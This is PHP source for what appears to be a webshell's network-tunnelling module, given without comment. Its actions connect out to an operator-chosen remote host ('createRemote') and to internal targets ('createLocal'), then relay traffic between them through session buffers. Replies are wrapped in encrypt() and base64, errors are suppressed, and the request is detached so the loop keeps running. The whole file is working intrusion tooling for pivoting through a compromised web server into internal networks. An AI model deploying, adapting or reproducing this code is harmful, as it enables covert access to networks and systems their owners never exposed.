<?
@error_reporting(0);
set_time_limit(0);
function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remoteIP = "", $remotePort = "", $extraData = "")
{
    hookSemGetForWindows();
    switch ($action) {
        case "createRemote":
            //fastcgi_finish_request();
            @session_start();
            $_SESSION["remoteRunning"] = true;
            session_write_close();
            global $read,$write, $outers, $targets,$usedOuter;
            $ready = false;
            $outers = array();
            $targets = array();
            $read = array();
            $write = array();
            $usedOuter=array();
            $exp = array();
            $available=0;
            $read = array_merge($targets, $outers);
            //finish();
            while ($_SESSION["remoteRunning"] === true) {

                //if ($ready == false) {
                //if ($available==0) {

                    $outtersocketObj = getSocket($remoteIP, $remotePort);
                    $outterSocket = $outtersocketObj["s"];
                    $s_type = $outtersocketObj["s_type"];
                    //$key=stream_socket_get_name($outterSocket,false);
                    $key=intval(explode(":",stream_socket_get_name($outterSocket,false))[1]);
                    //$key=intval($outterSocket);
                    $outers[$key] = $outterSocket;

                    $targetSocketObj = getSocket($targetIP, $targetPort);
                    $targetSocket = $targetSocketObj["s"];
                    $targets[$key] = $targetSocket;


                    $socketRead = "socket_read";
                    $socketWrite = "socket_write";
                    $socketClose = "socket_close";
                    $socketSelect = "socket_select";
                    if ($s_type == 'stream') {
                        $socketRead = "fread";
                        $socketWrite = "fwrite";
                        $socketClose = "fclose";
                        $socketSelect = "stream_select";
                    }
                    $available++;
                    $ready = true;
                //}
                $read = array();
                $read = array_merge($targets, $outers);
                $exp = array_merge($targets, $outers);
                //sleep(3);


                while ($socketSelect($read, $write=NULL, $exp=NULL, NULL)>0) {
                    foreach ($read as $socket_item) {
                        if (in_array($socket_item, $outers)) {
                            $key=intval(explode(":",stream_socket_get_name($socket_item,false))[1]);
                            $usedOuter[$key]=true;
                            //$key=stream_socket_get_name($socket_item,false);
                            if (isset($targets[$key])) {
                                $content = $socketRead($socket_item, 204800);
                                if (strlen($content) > 0) {
                                    $socketWrite($targets[$key], $content, strlen($content));
                                } else {
                                    //$ready = false;
                                    $socketClose($socket_item);
                                    $socketClose($targets[$key]);
                                    unset($outers[$key]);
                                    unset($usedOuter[$key]);
                                    unset($targets[$key]);
                                    //break;
                                }
                            }
                        }
                        if (in_array($socket_item, $targets)) {
                            foreach ($targets as $k => $v) {
                                if ($socket_item === $v) {
                                    if (isset($outers[$k])) {
                                        $content = $socketRead($socket_item, 204800);
                                        if (strlen($content) > 0) {
                                            $socketWrite($outers[$k], $content, strlen($content));
                                        } else {
                                            $socketClose($socket_item);
                                            $socketClose($outers[$k]);
                                            unset($targets[$k]);
                                            unset($outers[$k]);
                                            unset($usedOuter[$k]);
                                            //break;
                                        }
                                    }
                                }
                            }
                        }

                    }
                    $read = array_merge($targets, $outers);
                    if ((count($outers)>count($usedOuter)))
                    {
                        continue;
                    }
                    else
                    {
                        break;
                    }
                }

                // 当select没有监听到可操作fd的时候，直接continue进入下一次循环
                   // logs("select ===0");
                   // sleep(5);
            }
            break;
        case "createLocal":

            $localSocketObj = getSocket($targetIP, $targetPort);
            $localSocket = $localSocketObj["s"];
            $s_type = $localSocketObj["s_type"];
            if ($s_type == 'error') {
                echo "\x37\x21\x49\x36Failed connecting to target" . $targetIP . ":" . $targetPort;
                return;
            }



            $socketRead = "socket_read";
            $socketWrite = "socket_write";
            $socketClose = "socket_close";
            $socketSelect = "socket_select";
            if ($s_type == 'stream') {
                $socketRead = "fread";
                $socketWrite = "fwrite";
                $socketClose = "fclose";
                $socketSelect = "stream_select";
            }
            if ($s_type == 'stream') {
                stream_set_blocking($localSocket, false);
            } else {
                socket_set_nonblock($localSocket);
            }

            @session_start();
            $_SESSION["local_running" . $socketHash] = true;
            $_SESSION["writebuf" . $socketHash] = "";
            $_SESSION["readbuf" . $socketHash] = "";
            session_write_close();

            finish();
            $idleCount=0;
            while ($_SESSION["local_running" . $socketHash]) {
                $readBuff = "";

                //$semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
                //if (sem_acquire($semRes)) { 
                    @session_start();
                    $writeBuff = $_SESSION["writebuf" . $socketHash];
                    $_SESSION["writebuf" . $socketHash] = "";
                    session_write_close();
                    //sem_release($semRes);
                //}
                
                if ($writeBuff != "") {
                    $idleCount=0;
                    $i = $socketWrite($localSocket, $writeBuff, strlen($writeBuff));
                    if ($i === false) {
                        @session_start();
                        $_SESSION["local_running" . $socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed writing socket";
                    }
                }
                else
                {
                    $idleCount++;
                }
                while ($o = $socketRead($localSocket, 20480)) {
                    if ($o === false) {
                        @session_start();
                        $_SESSION["local_running" . $socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed reading from socket";
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != "") {
                    $idleCount=0;
                    $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
                    if (sem_acquire($semRes)) { 
                        @session_start();
                        $_SESSION["readbuf" . $socketHash] .= $readBuff;
                        session_write_close();
                        sem_release($semRes);
                    }

                }
                else
                {
                    $idleCount++;
                }
                if ($idleCount>100000)
                {
                    //sleep(1);
                }
                #sleep(0.2);
            }
            $socketClose($localSocket);
            break;
        case "read":
            @session_start();
            if (isset($_SESSION["local_running" . $socketHash])==false||$_SESSION["local_running" . $socketHash]==false) {
                @session_write_close();
                $result["status"] = base64_encode("fail");
                    $result["msg"] = base64_encode("tunnel is not running in server");
                    echo encrypt(json_encode($result));
                    return;
            }
            @session_write_close();
            $result = array();

            $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 
            if (sem_acquire($semRes)) { 
                @session_start();
                $readBuffer = $_SESSION["readbuf" . $socketHash];
                $_SESSION["readbuf" . $socketHash] = "";
                $running = $_SESSION["local_running" . $socketHash];
                session_write_close();
                sem_release($semRes);
            }
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode(base64_encode($readBuffer));
            echo encrypt(json_encode($result));
            break;
        case "write": 
                //header('Content-Type: application/octet-stream');
                $result = array();
                $rawPostData = base64_decode($extraData);
                if ($rawPostData) {

                    $semRes = sem_get((int)hexdec($socketHash), 1, 0666, 0); 

                    if (sem_acquire($semRes)) { 
                        @session_start();
                        $_SESSION["writebuf" . $socketHash] .= $rawPostData;
                        @session_write_close();
                        sem_release($semRes);
                    }
                }
                $result["status"] = base64_encode("success");
                $result["msg"] = base64_encode("ok");
                echo encrypt(json_encode($result));
            
            break;
        case "closeLocal":
            @session_start();
            $running = $_SESSION["local_running"] = false;
            foreach($_SESSION as $key=>$value)
            {
                if (strpos($key,"local_running")>=0)
                {
                    unset($_SESSION[$key]);
                }
            }
            //unset($_SESSION["local_running" . $socketHash]);
            session_write_close();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("ok");
            echo encrypt(json_encode($result));
            break;
        case "closeLocalWorker":
            @session_start();
            //$running = $_SESSION["local_running" . $socketHash] = false;
            unset( $_SESSION["local_running" . $socketHash]);
            session_write_close();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("ok");
            echo encrypt(json_encode($result));
            break;

        case "closeRemote":
            @session_start();
            $_SESSION["remoteRunning"] = false;
            session_write_close();
            $result["status"] = base64_encode("success");
            $result["msg"] = base64_encode("ok");
            echo encrypt(json_encode($result));
            break;
    }
}
function getSocket($ip, $port)
{
    $resultObj = array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    }
    if (!$s_type) {
        $s_type = "error";
        $s = 'no socket funcs';
    }
    if (!$s) {
        $s_type = "error";
        $s = 'no socket';
    }
    $resultObj["s"] = $s;
    $resultObj["s_type"] = $s_type;
    return $resultObj;
}
function finish()
{
    ob_end_clean();
    header("Connection: close");
    ignore_user_abort();
    ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    ob_end_flush();
    flush();
}


function hookSemGetForWindows()
{
    if(!function_exists("sem_get"))
{
    function sem_get($a,$b,$c,$d)
    {
        return true;
    }
    function sem_release($a)
    {
        
    }
    function sem_acquire($a)
    {
        return true;
    }
}
}